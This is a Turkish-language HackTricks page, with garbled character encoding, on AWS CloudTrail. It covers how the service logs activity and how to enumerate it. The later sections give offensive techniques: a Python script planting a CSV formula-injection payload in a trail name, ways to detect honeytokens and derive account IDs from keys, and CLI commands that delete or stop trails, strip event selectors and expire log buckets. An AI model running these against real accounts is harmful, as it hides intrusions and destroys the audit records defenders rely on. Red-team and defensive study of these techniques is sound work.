# AWS - CloudTrail Enum

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ Discord grubuna** [**katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail, **AWS ortamÄ±nÄ±zdaki etkinlikleri kaydeder ve izler**. AWS kaynaklarÄ±yla yapÄ±lan tÃ¼m etkileÅŸimler iÃ§in kimin ne yaptÄ±ÄŸÄ±nÄ±, ne zaman ve nereden yaptÄ±ÄŸÄ±nÄ± iÃ§eren ayrÄ±ntÄ±lÄ± **olay gÃ¼nlÃ¼klerini** yakalar. Bu, gÃ¼venlik analizi, uyumluluk denetimi ve kaynak deÄŸiÅŸiklik takibi iÃ§in bir denetim izi saÄŸlar. CloudTrail, kullanÄ±cÄ± ve kaynak davranÄ±ÅŸÄ±nÄ± anlamak, gÃ¼venlik duruÅŸunu artÄ±rmak ve yasal uyumluluÄŸu saÄŸlamak iÃ§in gereklidir.

Her kaydedilen olay ÅŸunlarÄ± iÃ§erir:

* Ã‡aÄŸrÄ±lan API'nin adÄ±: `eventName`
* Ã‡aÄŸrÄ±lan hizmet: `eventSource`
* Zaman: `eventTime`
* IP adresi: `SourceIPAddress`
* AracÄ± yÃ¶ntemi: `userAgent`. Ã–rnekler:
* Signing.amazonaws.com - AWS Management Console'dan
* console.amazonaws.com - HesabÄ±n kÃ¶k kullanÄ±cÄ±sÄ±
* lambda.amazonaws.com - AWS Lambda
* Ä°stek parametreleri: `requestParameters`
* YanÄ±t Ã¶ÄŸeleri: `responseElements`

Olaylar **yaklaÅŸÄ±k her 5 dakikada bir JSON dosyasÄ±nda yeni bir gÃ¼nlÃ¼k dosyasÄ±na yazÄ±lÄ±r**, CloudTrail tarafÄ±ndan tutulur ve son olarak, gÃ¼nlÃ¼k dosyalarÄ± **yaklaÅŸÄ±k 15 dakika sonra S3'e teslim edilir**.\
CloudTrail gÃ¼nlÃ¼kleri **hesaplar ve bÃ¶lgeler arasÄ±nda birleÅŸtirilebilir.**\
CloudTrail, **gÃ¼nlÃ¼k dosyalarÄ±nÄ±zÄ±n CloudTrail tarafÄ±ndan size teslim edildiÄŸinden beri deÄŸiÅŸmeden kaldÄ±ÄŸÄ±nÄ± doÄŸrulamanÄ±za olanak tanÄ±yan gÃ¼nlÃ¼k dosyasÄ± bÃ¼tÃ¼nlÃ¼ÄŸÃ¼ kullanmanÄ±za izin verir.** GÃ¼nlÃ¼klerin iÃ§inde bir SHA-256 hash oluÅŸturur. Yeni gÃ¼nlÃ¼klerin SHA-256 hash'i her saat oluÅŸturulur.\
Bir Trail oluÅŸtururken, olay seÃ§iciler size Trail'in yÃ¶netim, veri veya iÃ§gÃ¶rÃ¼ olaylarÄ±nÄ± kaydetmesini belirtmenize olanak tanÄ±r.

GÃ¼nlÃ¼kler bir S3 bucket'Ä±nda saklanÄ±r. VarsayÄ±lan olarak Sunucu TarafÄ± Åifreleme (SSE-S3) kullanÄ±lÄ±r, bu nedenle AWS, eriÅŸimi olan kiÅŸiler iÃ§in iÃ§eriÄŸi ÅŸifreler, ancak ek gÃ¼venlik iÃ§in KMS ve kendi anahtarlarÄ±nÄ±zla SSE kullanabilirsiniz.

GÃ¼nlÃ¼kler **bu ad formatÄ±na sahip bir S3 bucket'Ä±nda saklanÄ±r**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Ã–rnek: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Her klasÃ¶rÃ¼n iÃ§inde her gÃ¼nlÃ¼k **ÅŸu formatÄ± takip eden bir ada sahip olacaktÄ±r**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

GÃ¼nlÃ¼k DosyasÄ± AdlandÄ±rma KurallarÄ±

![](<../../../../.gitbook/assets/image (122).png>)

AyrÄ±ca, **dosya bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ kontrol etmek iÃ§in sindirim dosyalarÄ±** **aynÄ± bucket'Ä±n** iÃ§inde olacaktÄ±r:

![](<../../../../.gitbook/assets/image (195).png>)

### Birden Fazla Hesaptan GÃ¼nlÃ¼kleri BirleÅŸtirme

* GÃ¼nlÃ¼k dosyalarÄ±nÄ±n teslim edileceÄŸi AWS hesabÄ±nda bir Trial oluÅŸturun
* CloudTrail iÃ§in Ã§apraz hesap eriÅŸimine izin veren ve eriÅŸime ihtiyaÃ§ duyan her AWS hesabÄ±na izin veren hedef S3 bucket'Ä±na izinler uygulayÄ±n
* DiÄŸer AWS hesaplarÄ±nda yeni bir Trail oluÅŸturun ve 1. adÄ±mda oluÅŸturulan bucket'Ä± kullanmayÄ± seÃ§in

Ancak, tÃ¼m gÃ¼nlÃ¼kleri aynÄ± S3 bucket'Ä±nda saklayabilseniz bile, birden fazla hesaptan CloudTrail gÃ¼nlÃ¼klerini tek bir AWS hesabÄ±na ait CloudWatch Logs'a birleÅŸtiremezsiniz.

{% hint style="danger" %}
Bir hesabÄ±n **farklÄ± gÃ¼nlÃ¼kleri farklÄ± bucket'larda saklayan** CloudTrail'den **etkinleÅŸtirilmiÅŸ** farklÄ± Trail'lere sahip olabileceÄŸini unutmayÄ±n.
{% endhint %}

### TÃ¼m org hesaplarÄ±ndan tek bir Cloudtrail

Bir CloudTrail oluÅŸtururken, tÃ¼m org hesaplarÄ± iÃ§in cloudtrail'i etkinleÅŸtirmek ve gÃ¼nlÃ¼kleri tek bir bucket'a almak mÃ¼mkÃ¼ndÃ¼r:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Bu ÅŸekilde, tÃ¼m hesaplarÄ±n tÃ¼m bÃ¶lgelerinde CloudTrail'i kolayca yapÄ±landÄ±rabilir ve gÃ¼nlÃ¼kleri tek bir hesapta merkezileÅŸtirebilirsiniz (korumanÄ±z gereken hesap).

### GÃ¼nlÃ¼k DosyalarÄ±nÄ± Kontrol Etme

GÃ¼nlÃ¼klerin deÄŸiÅŸtirilmediÄŸini kontrol edebilirsiniz

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs to CloudWatch

**CloudTrail, ÅŸÃ¼pheli aktiviteler gerÃ§ekleÅŸtirildiÄŸinde sizi uyaran uyarÄ±lar ayarlayabilmeniz iÃ§in otomatik olarak loglarÄ± CloudWatch'a gÃ¶nderebilir.**\
CloudTrail'in loglarÄ± CloudWatch'a gÃ¶ndermesine izin vermek iÃ§in bir **rol** oluÅŸturulmasÄ± gerektiÄŸini unutmayÄ±n. MÃ¼mkÃ¼nse, bu iÅŸlemleri gerÃ§ekleÅŸtirmek iÃ§in AWS varsayÄ±lan rolÃ¼nÃ¼ kullanmanÄ±z Ã¶nerilir. Bu rol, CloudTrail'in ÅŸunlarÄ± yapmasÄ±na izin verecektir:

* CreateLogStream: CloudWatch Logs log akÄ±ÅŸlarÄ± oluÅŸturmasÄ±na izin verir
* PutLogEvents: CloudTrail loglarÄ±nÄ± CloudWatch Logs log akÄ±ÅŸÄ±na teslim eder

### Event History

CloudTrail Event History, kaydedilen loglarÄ± bir tabloda incelemenizi saÄŸlar:

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights**, CloudTrail yollarÄ±ndan yazma yÃ¶netim olaylarÄ±nÄ± otomatik olarak **analiz eder** ve sizi **olaÄŸandÄ±ÅŸÄ± aktivitelere** karÅŸÄ± **uyarÄ±r**. Ã–rneÄŸin, belirlenmiÅŸ temel deÄŸerlerden farklÄ± olarak `TerminateInstance` olaylarÄ±nda bir artÄ±ÅŸ olursa, bunu bir Insight olayÄ± olarak gÃ¶rÃ¼rsÃ¼nÃ¼z. Bu olaylar, **olaÄŸandÄ±ÅŸÄ± API aktivitelerini bulmayÄ± ve yanÄ±t vermeyi her zamankinden daha kolay hale getirir**.

Insight'lar, CloudTrail loglarÄ±nÄ±n bulunduÄŸu aynÄ± kovada saklanÄ±r: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Security

| CloudTrail Log File Integrity        | <ul><li>LoglarÄ±n deÄŸiÅŸtirilip deÄŸiÅŸtirilmediÄŸini (deÄŸiÅŸtirilmiÅŸ veya silinmiÅŸ) doÄŸrulayÄ±n</li><li><p>Ã–zet dosyalarÄ± kullanÄ±r (her dosya iÃ§in hash oluÅŸturur)</p><ul><li>SHA-256 hashing</li><li>SHA-256 ile RSA dijital imzalama</li><li>Amazon tarafÄ±ndan sahip olunan Ã¶zel anahtar</li></ul></li><li>Ã–zet dosyasÄ± oluÅŸturmak 1 saat sÃ¼rer (her saat baÅŸÄ± yapÄ±lÄ±r)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop unauthorized access             | <ul><li><p>IAM politikalarÄ± ve S3 kova politikalarÄ±nÄ± kullanÄ±n</p><ul><li>gÃ¼venlik ekibi â€”> yÃ¶netici eriÅŸimi</li><li>denetÃ§iler â€”> yalnÄ±zca okuma eriÅŸimi</li></ul></li><li>LoglarÄ± ÅŸifrelemek iÃ§in SSE-S3/SSE-KMS kullanÄ±n</li></ul>                                                                                                                                        |
| Prevent log files from being deleted | <ul><li>IAM ve kova politikalarÄ± ile silme eriÅŸimini kÄ±sÄ±tlayÄ±n</li><li>S3 MFA silmeyi yapÄ±landÄ±rÄ±n</li><li>Log DosyasÄ± DoÄŸrulamasÄ± ile doÄŸrulayÄ±n</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor, son 400 gÃ¼nÃ¼n AWS **CloudTrail loglarÄ±na dayanarak iÃ§gÃ¶rÃ¼lerini toplar**. CloudTrail, bir AWS hesabÄ±nda yapÄ±lan AWS API Ã§aÄŸrÄ±larÄ±nÄ±n ve ilgili olaylarÄ±n geÃ§miÅŸini yakalar. Access Advisor, bu verileri kullanarak **hizmetlerin en son ne zaman eriÅŸildiÄŸini gÃ¶sterir**. CloudTrail loglarÄ±nÄ± analiz ederek, Access Advisor bir IAM kullanÄ±cÄ±sÄ±nÄ±n veya rolÃ¼nÃ¼n hangi AWS hizmetlerine eriÅŸtiÄŸini ve bu eriÅŸimin ne zaman gerÃ§ekleÅŸtiÄŸini belirleyebilir. Bu, AWS yÃ¶neticilerinin **izinleri iyileÅŸtirme** konusunda bilinÃ§li kararlar almasÄ±na yardÄ±mcÄ± olur, Ã§Ã¼nkÃ¼ uzun sÃ¼re eriÅŸilmeyen hizmetleri belirleyebilir ve gerÃ§ek kullanÄ±m kalÄ±plarÄ±na dayalÄ± olarak aÅŸÄ±rÄ± geniÅŸ izinleri potansiyel olarak azaltabilirler.

{% hint style="success" %}
Bu nedenle, Access Advisor, **kullanÄ±cÄ±lara verilen gereksiz izinler hakkÄ±nda bilgi verir** bÃ¶ylece yÃ¶netici bunlarÄ± kaldÄ±rabilir
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

CloudTrail iÃ§inde CSV enjeksiyonu yapmak mÃ¼mkÃ¼ndÃ¼r ve bu, gÃ¼nlÃ¼kler CSV olarak dÄ±ÅŸa aktarÄ±lÄ±p Excel ile aÃ§Ä±ldÄ±ÄŸÄ±nda rastgele kod Ã§alÄ±ÅŸtÄ±racaktÄ±r.\
AÅŸaÄŸÄ±daki kod, yÃ¼kÃ¼ iÃ§eren kÃ¶tÃ¼ bir Trail adÄ±yla gÃ¼nlÃ¼k giriÅŸi oluÅŸturacaktÄ±r:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Daha fazla bilgi iÃ§in CSV Injections sayfasÄ±na bakÄ±n:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Bu Ã¶zel teknik hakkÄ±nda daha fazla bilgi iÃ§in [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/) adresine bakÄ±n.

## **Tespiti Atlatma**

### HoneyTokens **atlatma**

Honeytokens, **hassas bilgilerin sÄ±zdÄ±rÄ±lmasÄ±nÄ± tespit etmek** iÃ§in oluÅŸturulmuÅŸtur. AWS durumunda, **kullanÄ±mÄ± izlenen AWS anahtarlarÄ±dÄ±r**, eÄŸer biri bu anahtarla bir iÅŸlem tetiklerse, o anahtarÄ±n Ã§alÄ±nmÄ±ÅŸ olmasÄ± gerekir.

Ancak, [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) tarafÄ±ndan oluÅŸturulan Honeytokens, ya tanÄ±nabilir hesap adÄ± kullanÄ±yor ya da tÃ¼m mÃ¼ÅŸterileri iÃ§in aynÄ± AWS hesap kimliÄŸini kullanÄ±yor. Bu nedenle, Cloudtrail'in herhangi bir gÃ¼nlÃ¼k oluÅŸturmasÄ±nÄ± saÄŸlamadan hesap adÄ±nÄ± ve/veya hesap kimliÄŸini alabilirseniz, **anahtarÄ±n bir honeytoken olup olmadÄ±ÄŸÄ±nÄ± bilebilirsiniz**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57), bir anahtarÄ±n [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**'a ait olup olmadÄ±ÄŸÄ±nÄ± tespit etmek iÃ§in bazÄ± kurallara sahiptir:**

* EÄŸer **`canarytokens.org`** rol adÄ±nda gÃ¶rÃ¼nÃ¼yorsa veya hata mesajÄ±nda hesap kimliÄŸi **`534261010715`** gÃ¶rÃ¼nÃ¼yorsa.
* Daha yakÄ±n zamanda test edildiÄŸinde, hesap **`717712589309`** kullanÄ±lÄ±yor ve hala adÄ±nda **`canarytokens.com`** dizesi var.
* Hata mesajÄ±nda rol adÄ±nda **`SpaceCrab`** gÃ¶rÃ¼nÃ¼yorsa
* **SpaceSiren**, kullanÄ±cÄ± adlarÄ±nÄ± oluÅŸturmak iÃ§in **uuids** kullanÄ±r: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* EÄŸer **ad rastgele oluÅŸturulmuÅŸ gibi gÃ¶rÃ¼nÃ¼yorsa**, HoneyToken olma olasÄ±lÄ±ÄŸÄ± yÃ¼ksektir.

#### Anahtar KimliÄŸinden Hesap KimliÄŸini Almak

**Hesap KimliÄŸi**'ni, **eriÅŸim anahtarÄ±** iÃ§inde **kodlanmÄ±ÅŸ** olarak [**burada aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) alabilir ve hesap kimliÄŸini Honeytokens AWS hesaplarÄ±nÄ±zÄ±n listesiyle kontrol edebilirsiniz:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Daha fazla bilgi iÃ§in [**orijinal araÅŸtÄ±rmaya**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) gÃ¶z atÄ±n.

#### GÃ¼nlÃ¼k oluÅŸturma

Bunun iÃ§in en etkili teknik aslÄ±nda basit bir yÃ¶ntemdir. BulduÄŸunuz anahtarÄ± kullanarak kendi saldÄ±rgan hesabÄ±nÄ±zda bir hizmete eriÅŸin. Bu, **CloudTrail'in KENDÄ° AWS hesabÄ±nÄ±zda bir gÃ¼nlÃ¼k oluÅŸturmasÄ±nÄ± saÄŸlar, kurbanÄ±n hesabÄ±nda deÄŸil**.

Ã‡Ä±ktÄ± size bir hata gÃ¶sterecek ve hesap kimliÄŸi ile hesap adÄ±nÄ± belirtecektir, bÃ¶ylece **Honeytoken olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rebileceksiniz**.

#### GÃ¼nlÃ¼k kaydÄ± olmayan AWS hizmetleri

GeÃ§miÅŸte bazÄ± **AWS hizmetleri CloudTrail'e gÃ¼nlÃ¼k gÃ¶ndermezdi** (bir [listeyi burada bulabilirsiniz](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Bu hizmetlerden bazÄ±larÄ±, yetkisiz biri (honeytoken anahtarÄ±) eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda **anahtar rolÃ¼nÃ¼n ARN'sini** iÃ§eren bir **hata** ile yanÄ±t verecektir.

Bu ÅŸekilde, bir **saldÄ±rgan herhangi bir gÃ¼nlÃ¼k tetiklemeden anahtarÄ±n ARN'sini elde edebilir**. ARN'de saldÄ±rgan **AWS hesap kimliÄŸini ve adÄ±nÄ±** gÃ¶rebilir, HoneyToken'Ä±n ÅŸirket hesap kimliklerini ve adlarÄ±nÄ± bilmek kolaydÄ±r, bu ÅŸekilde bir saldÄ±rgan token'Ä±n HoneyToken olup olmadÄ±ÄŸÄ±nÄ± belirleyebilir.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
CloudTrail gÃ¼nlÃ¼kleri oluÅŸturmayan tÃ¼m kamuya aÃ§Ä±k API'lerin ÅŸimdi dÃ¼zeltildiÄŸini unutmayÄ±n, bu yÃ¼zden belki kendi yÃ¶ntemlerinizi bulmanÄ±z gerekebilir...

Daha fazla bilgi iÃ§in [**orijinal araÅŸtÄ±rmaya**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/) gÃ¶z atÄ±n.
{% endhint %}

### ÃœÃ§Ã¼ncÃ¼ AltyapÄ±ya EriÅŸim

BazÄ± AWS hizmetleri **veritabanlarÄ±** veya **Kubernetes** kÃ¼meleri (EKS) gibi **altyapÄ±lar oluÅŸturur**. Bir kullanÄ±cÄ± **doÄŸrudan bu hizmetlerle konuÅŸtuÄŸunda** (Ã¶rneÄŸin Kubernetes API'si gibi) **AWS API'sini kullanmaz**, bu nedenle CloudTrail bu iletiÅŸimi gÃ¶remez.

Bu nedenle, EKS'ye eriÅŸimi olan ve EKS API'sinin URL'sini keÅŸfeden bir kullanÄ±cÄ±, yerel olarak bir token oluÅŸturabilir ve **CloudTrail tarafÄ±ndan tespit edilmeden API hizmetiyle doÄŸrudan konuÅŸabilir**.

Daha fazla bilgi iÃ§in:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail YapÄ±landÄ±rmasÄ±nÄ± DeÄŸiÅŸtirme

#### Ä°zleri silme
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Stop trails

AWS CloudTrail, AWS hesaplarÄ±ndaki API Ã§aÄŸrÄ±larÄ±nÄ± kaydeden bir hizmettir. Bu hizmet, gÃ¼venlik analizi, izleme ve uyumluluk denetimleri iÃ§in kullanÄ±lÄ±r. Ancak, kÃ¶tÃ¼ niyetli bir aktÃ¶r, izlerini gizlemek iÃ§in CloudTrail'i durdurabilir. Bu nedenle, CloudTrail'in durdurulmasÄ±, gÃ¼venlik ekipleri tarafÄ±ndan dikkatle izlenmelidir.

```bash
aws cloudtrail stop-logging --name <trail-name>
```

YukarÄ±daki komut, belirli bir trail'in kaydÄ±nÄ± durdurur. Bu komutun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±, gÃ¼venlik olaylarÄ±nÄ±n tespit edilmesini zorlaÅŸtÄ±rabilir.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Ã‡ok bÃ¶lgeli kaydÄ± devre dÄ±ÅŸÄ± bÄ±rak

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### Olay SeÃ§icileri ile GÃ¼nlÃ¼k KaydÄ±nÄ± Devre DÄ±ÅŸÄ± BÄ±rakma

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Ä°lk Ã¶rnekte, tek bir olay seÃ§ici, tek bir nesne ile bir JSON dizisi olarak saÄŸlanmÄ±ÅŸtÄ±r. `"ReadWriteType": "ReadOnly"` **olay seÃ§icinin yalnÄ±zca salt okunur olaylarÄ± yakalamasÄ± gerektiÄŸini** belirtir (bu nedenle CloudTrail iÃ§gÃ¶rÃ¼leri **Ã¶rneÄŸin yazma** olaylarÄ±nÄ± kontrol etmeyecektir).

Olay seÃ§iciyi Ã¶zel gereksinimlerinize gÃ¶re Ã¶zelleÅŸtirebilirsiniz.

#### S3 yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ± ile loglarÄ±n silinmesi

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Bucket YapÄ±landÄ±rmasÄ±nÄ± DeÄŸiÅŸtirme

* S3 bucket'Ä±nÄ± sil
* Bucket politikasÄ±nÄ± CloudTrail servisinden gelen yazma iÅŸlemlerini reddedecek ÅŸekilde deÄŸiÅŸtir
* S3 bucket'Ä±na nesneleri silmek iÃ§in yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ± ekle
* CloudTrail loglarÄ±nÄ± ÅŸifrelemek iÃ§in kullanÄ±lan kms anahtarÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rak

### Cloudtrail fidye yazÄ±lÄ±mÄ±

#### S3 fidye yazÄ±lÄ±mÄ±

**Asimetrik bir anahtar oluÅŸturabilir** ve **CloudTrail'in verileri bu anahtarla ÅŸifrelemesini saÄŸlayabilir** ve **Ã¶zel anahtarÄ± silebilirsiniz** bÃ¶ylece CloudTrail iÃ§erikleri kurtarÄ±lamaz.\
Bu temelde **S3-KMS fidye yazÄ±lÄ±mÄ±** olarak aÃ§Ä±klanmÄ±ÅŸtÄ±r:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS fidye yazÄ±lÄ±mÄ±**

Bu, Ã¶nceki saldÄ±rÄ±yÄ± farklÄ± izin gereksinimleriyle gerÃ§ekleÅŸtirmek iÃ§in en kolay yoldur:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referanslar**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸren & pratik yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸren & pratik yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekle</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol et!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±l veya **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) bizi takip et.
* **HackTricks'e** [**PR gÃ¶ndererek**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna katkÄ±da bulunarak hacking ipuÃ§larÄ±nÄ± paylaÅŸ.

</details>
{% endhint %}
